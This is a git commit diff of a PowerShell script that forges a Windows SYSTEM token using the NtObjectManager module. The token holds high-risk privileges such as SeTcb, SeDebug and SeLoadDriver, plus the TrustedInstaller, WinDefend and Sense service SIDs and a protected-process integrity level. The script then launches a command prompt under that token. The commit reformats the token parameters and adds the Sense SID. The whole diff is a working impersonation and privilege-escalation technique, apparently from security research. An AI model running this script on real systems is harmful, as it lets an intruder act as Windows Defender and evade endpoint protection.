c3b43106fca34453ef388b1ba6e19a8c6fd40b3e
Remko Weijnen <r.weijnen@gmail.com>
2024-04-24 12:25:53 -0400

    Update ImpersonateWinDefend.ps1
    Improved formatting/readability with splatting

--- ImpersonateWinDefend.ps1
+++ ImpersonateWinDefend.ps1
@@ -1,8 +1,6 @@
-# quick example to spawn cmd prompt with crafted toking, including Trusted Installer and Windows Defender Service SID in the TokenGroups
-# using NtObjectManager module
-
 $winDefendSid = Get-NtSid -ServiceName "WinDefend"
 $trustedInstallerSid = Get-NtSid -ServiceName "TrustedInstaller"
+$senseSid = Get-NtSid -ServiceName "SenseSid"
 
 # get winlogon pid
 $winLogonPid = (get-process winlogon).id
@@ -35,7 +33,41 @@ ForEach ($priv in $disabledPrivileges)
 	Enable-NtTokenPrivilege -Privilege $priv
 }
 
-$token = New-NtToken -User SY -TokenType Primary -Access MaximumAllowed -Privileges SeCreateGlobalPrivilege,SeTrustedCredManAccessPrivilege,SeTakeOwnershipPrivilege,SeLoadDriverPrivilege,SeSecurityPrivilege,SeIncreaseQuotaPrivilege,SeAssignPrimaryTokenPrivilege,SeDebugPrivilege,SeImpersonatePrivilege,SeCreateTokenPrivilege,SeTcbPrivilege -Groups $trustedInstallerSid.ToString(),$winDefendSid.ToString(), BA, WD, S-1-5-32-545,S-1-5-6,S-1-5-15,S-1-5-11,S-1-5-80-1523878533-411328482-2798077809-3098663872-2604013308
+$tokenParams = @{
+    User = 'SY'
+    TokenType = 'Primary'
+    Access = 'MaximumAllowed'
+    Privileges = @(
+        'SeAssignPrimaryTokenPrivilege',
+        'SeCreateGlobalPrivilege',
+        'SeCreateTokenPrivilege',
+        'SeDebugPrivilege',
+        'SeImpersonatePrivilege',
+        'SeIncreaseQuotaPrivilege',
+        'SeLoadDriverPrivilege',
+        'SeSecurityPrivilege',
+        'SeTakeOwnershipPrivilege',
+        'SeTcbPrivilege',
+        'SeTrustedCredManAccessPrivilege'
+    ) -join ','
+    Groups = @(
+        'BA',
+        'WD',
+        'S-1-5-6',
+        'S-1-5-11',
+        'S-1-5-15',
+        'S-1-5-32-545',
+		'S-1-16-16384',
+        $(Get-NtSid -ServiceName "TrustedInstaller"),
+        $(Get-NtSid -ServiceName "WinDefend"),
+        $(Get-NtSid -ServiceName "Sense")
+    )
+}
+
+# Create a new NT token with the specified parameters
+$token = New-NtToken @tokenParams
+
+#$token = New-NtToken -User SY -TokenType Primary -Access MaximumAllowed -Privileges SeCreateGlobalPrivilege,SeTrustedCredManAccessPrivilege,SeTakeOwnershipPrivilege,SeLoadDriverPrivilege,SeSecurityPrivilege,SeIncreaseQuotaPrivilege,SeAssignPrimaryTokenPrivilege,SeDebugPrivilege,SeImpersonatePrivilege,SeCreateTokenPrivilege,SeTcbPrivilege -Groups $trustedInstallerSid.ToString(),$winDefendSid.ToString(), BA, WD, S-1-5-32-545,S-1-5-6,S-1-5-15,S-1-5-11,S-1-5-80-1523878533-411328482-2798077809-3098663872-2604013308,S-1-5-5-0-410203
 $dupToken = Copy-NtToken -Token $token -ImpersonationLevel Impersonation -Access MaximumAllowed
 
 New-Win32Process -CommandLine "cmd.exe /k echo **WINDOWS DEFENDER COMMAND PROMPT** && whoami /groups" -Token $dupToken
@@ -45,4 +77,3 @@ $contextLsas.Revert()
 $contextLsas.Dispose()
 $contextWinLogon.Revert()
 $contextWinLogon.Dispose()
-
